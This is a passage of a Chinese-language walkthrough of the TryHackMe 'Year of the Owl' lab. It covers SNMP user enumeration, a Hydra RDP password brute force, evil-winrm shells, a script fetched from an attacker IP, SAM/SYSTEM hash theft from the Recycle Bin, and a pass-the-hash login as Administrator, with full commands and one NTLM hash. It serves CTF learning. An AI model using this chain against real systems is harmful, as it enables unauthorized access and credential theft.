iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ snmpwalk -v2c -c openview -On 10.10.3.171 1.3.6.1.2.1.1

.1.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)"
.1.3.6.1.2.1.1.2.0 = OID: .1.3.6.1.4.1.311.1.1.3.1.2
.1.3.6.1.2.1.1.3.0 = Timeticks: (611640) 1:41:56.40
.1.3.6.1.2.1.1.4.0 = ""
.1.3.6.1.2.1.1.5.0 = STRING: "year-of-the-owl"
.1.3.6.1.2.1.1.6.0 = ""
.1.3.6.1.2.1.1.7.0 = INTEGER: 76
```

#### msfconsle
也可以透過 `auxiliary/scanner/snmp/snmp_enumusers` 取得 users
```bash
msf6 auxiliary(scanner/snmp/snmp_enumusers) > show options

Module options (auxiliary/scanner/snmp/snmp_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  openview         yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS     owl.thm          yes       The target host(s), see https://d
                                         ocs.metasploit.com/docs/using-met
                                         asploit/basics/using-metasploit.h
                                         tml
   RPORT      161              yes       The target port (UDP)
   THREADS    1                yes       The number of concurrent threads
                                         (max one per host)
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/snmp/snmp_enumusers) > run
[+] 10.10.3.171:161 Found 5 users: Administrator, DefaultAccount, Guest, Jareth, WDAGUtilityAccount
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

發現 user `Jareth`

### hydra

`hydra` 不加 `-t 1 -W 3` 會一直斷線  
加了又跑很慢  
所以問了 AI 教我怎麼透過網頁自製字典  
https://championvalley.angelfire.com/1Lab_JOwl.html
> 網頁 來自 google owl 跟 user 名稱 找到的

從原本的 rockyou.txt 一千多萬個 縮減到六千個  
但還是跑超慢 根本跑不完  
> 找到密碼後
> 確認了此自製字典 `wordlist.txt` 裡面有密碼沒錯
> 但大小寫沒對到 QQ 所以如果自己要做
> 第一個暴力破解超慢 再來就是 大小寫密碼都要跑一次 才能找到密碼

```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ cewl https://championvalley.angelfire.com/1Lab_JOwl.html -w wordlist.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ wc wordlist.txt            
 6680  6680 51877 wordlist.txt
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ sort -u wordlist.txt -o wordlist.txt 
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ wc wordlist.txt 
 6680  6680 51877 wordlist.txt
                                                                            
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ hydra -l Jareth -P wordlist.txt owl.thm rdp -t 1 -W 3 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-31 13:46:06
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 6680 login tries (l:1/p:6680), ~6680 tries per task
[DATA] attacking rdp://owl.thm:3389/
[STATUS] 9.00 tries/min, 9 tries in 00:01h, 6671 to do in 12:22h, 1 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
所以偷吃步用 AI 提供給我 跟題目有關的電影的一些單字  
做成超小字典 成功取得密碼
> 不知道有沒有更好的做法？

```bash                                                                      
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ cat > labyrinth.txt << 'EOF'
jareth
Jareth
labyrinth
Labyrinth
goblin
Goblin
sarah
Sarah
owl
Owl
1986
GoblinKing
goblinKing
YearOfTheOwl
yearoftheowl
AsTheWorldFallsDown
bowie
Bowie
DavidBowie
magic
Magic
crystal
Crystal
EOF

┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ hydra -l Jareth -P labyrinth.txt owl.thm rdp -t 1 -W 3
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-31 13:33:25
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 23 login tries (l:1/p:23), ~23 tries per task
[DATA] attacking rdp://owl.thm:3389/
[3389][rdp] account on 10.10.3.171 might be valid but account not active for remote desktop: login: Jareth password: [REDACTED], continuing attacking the account.
[STATUS] 8.00 tries/min, 8 tries in 00:01h, 15 to do in 00:02h, 1 active
[STATUS] 8.50 tries/min, 17 tries in 00:02h, 6 to do in 00:01h, 1 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-31 13:36:07

```

後來發現 密碼跟[演員](https://www.imdb.com/title/tt0091369/)有關
或許之後可以嘗試 找演員名稱的大小寫做成字典
![alt text](image.png)


### crackmapexec
確認密碼是否有效
```bash
└─$ crackmapexec winrm owl.thm -u 'Jareth' -p '[REDACTED]'
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         owl.thm         5985   YEAR-OF-THE-OWL  [*] Windows 10 / Server 2019 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl)
HTTP        owl.thm         5985   YEAR-OF-THE-OWL  [*] http://owl.thm:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       owl.thm         5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:[REDACTED] (Pwn3d!)

```

### evil-winrm - get user remote
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ evil-winrm -i owl.thm -u Jareth
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Jareth\Documents>
```

### get flag
```bash
*Evil-WinRM* PS C:\Users\Jareth\Desktop> Get-ChildItem -Path C:\Users\* -Filter user.txt -Recurse -ErrorAction SilentlyContinue -Force | Select-Object -ExpandProperty FullName
 
C:\Users\Jareth\Desktop\user.txt
C:\Users\desktop.ini

*Evil-WinRM* PS C:\Users\Jareth\Desktop> dir


    Directory: C:\Users\Jareth\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   2:21 AM             80 user.txt


*Evil-WinRM* PS C:\Users\Jareth\Desktop> cat user.txt
THM{Y2...Bl}
```

[winPEAS.bat](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat)




## Privilege Escalation 

### jaws
到Ｃ槽根目錄 創建 `temp` 放 [jaws-enum.ps1](https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1) 並執行
```bash
*Evil-WinRM* PS C:\Users\Jareth\Desktop> cd \
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/18/2020   2:04 AM                PerfLogs
d-r---        9/17/2020   7:39 PM                Program Files
d-----        9/17/2020   7:39 PM                Program Files (x86)
d-r---        9/18/2020   2:14 AM                Users
d-----       11/13/2020  10:33 PM                Windows
d-----        9/17/2020   8:18 PM                xampp


*Evil-WinRM* PS C:\> mkdir temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/31/2025   6:57 AM                temp


*Evil-WinRM* PS C:\> cd temp
*Evil-WinRM* PS C:\temp> dir
*Evil-WinRM* PS C:\temp> invoke-webrequest 10.4.11.38/jaws-enum.ps1 -out jaws.ps1
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2025   7:03 AM          16974 jaws.ps1


*Evil-WinRM* PS C:\temp> ./jaws.ps1

Running J.A.W.S. Enumeration
```

### `$Recycle.Bin`
到 C 槽根目錄 可發現 `$Recycle.Bin`
```bash
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   2:14 AM                $Recycle.Bin
d--hsl        9/17/2020   7:27 PM                Documents and Settings
d-----        9/18/2020   2:04 AM                PerfLogs
d-r---        9/17/2020   7:39 PM                Program Files
d-----        9/17/2020   7:39 PM                Program Files (x86)
d--h--        9/18/2020   2:04 AM                ProgramData
d--hs-        9/17/2020   7:27 PM                Recovery
d--hs-        9/17/2020   7:26 PM                System Volume Information
d-----       10/31/2025   7:03 AM                temp
d-r---        9/18/2020   2:14 AM                Users
d-----       11/13/2020  10:33 PM                Windows
d-----        9/17/2020   8:18 PM                xampp
-a-hs-       10/31/2025   3:27 AM     1207959552 pagefile.sys
```

檢視裡面的路徑
```bash
*Evil-WinRM* PS C:\> gci -path 'C:\$Recycle.Bin' -h


    Directory: C:\$Recycle.Bin


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500


*Evil-WinRM* PS C:\> Get-LocalUser -Name $env:USERNAME | Select sid

SID
---
S-1-5-21-1987495829-1628902820-919763334-1001


*Evil-WinRM* PS C:\> 
```

```bash
*Evil-WinRM* PS C:\> gci -force '$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001'


    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-        9/18/2020   2:14 AM            129 desktop.ini
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak


*Evil-WinRM* PS C:\> 
```

### 發現 `.bak`
```bash
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2025   7:03 AM          16974 jaws.ps1


*Evil-WinRM* PS C:\temp> copy 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\sam.bak' 'C:\temp'
*Evil-WinRM* PS C:\temp> copy 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak' 'C:\temp'
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2025   7:03 AM          16974 jaws.ps1
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak


*Evil-WinRM* PS C:\temp> download sam.bak
                                        
Info: Downloading C:\temp\sam.bak to sam.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.bak
                                        
Info: Downloading C:\temp\system.bak to system.bak
Progress: 6% : |▒░░░░░░░░░░|          

                                        
Info: Download successful!       
```

### impacket-secretsdump
下載到本機後 破解取得 `Administrator` 密碼
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ impacket-secretsdump -ts local -sam sam.bak -system system.bak
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-10-31 15:50:48] [*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[2025-10-31 15:50:48] [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aa...7a:::
Guest:501:aad...c0:::
DefaultAccount:50...9c0:::
WDAGUtilityAccount:504...11b:::
Jareth:1001:aad...5a:::
[2025-10-31 15:50:48] [*] Cleaning up... 
```

### evil-winrm - get admin remote
```bash
┌──(kali㉿kali)-[~/tryhackme/yearOfTheOwl]
└─$ evil-winrm -i owl.thm -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### get flag
```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir -force


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   2:19 AM             80 admin.txt
-a-hs-        9/18/2020   2:06 AM            282 desktop.ini


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat admin.txt
THM{YW...M2}

```

## 參考資料
- https://apjone.uk/tryhackme-year-of-the-owl/
- https://diannaosec.blogspot.com/2023/05/hacking-year-of-owl-thm.html
- https://medium.com/@fabio.a.felgueiras/year-of-the-owl-a-tryhackme-challenge-write-up-a501ac853bad

**Note**: 此 writeup 僅用於教育目的,請勿在未經授權的系統上進行測試。


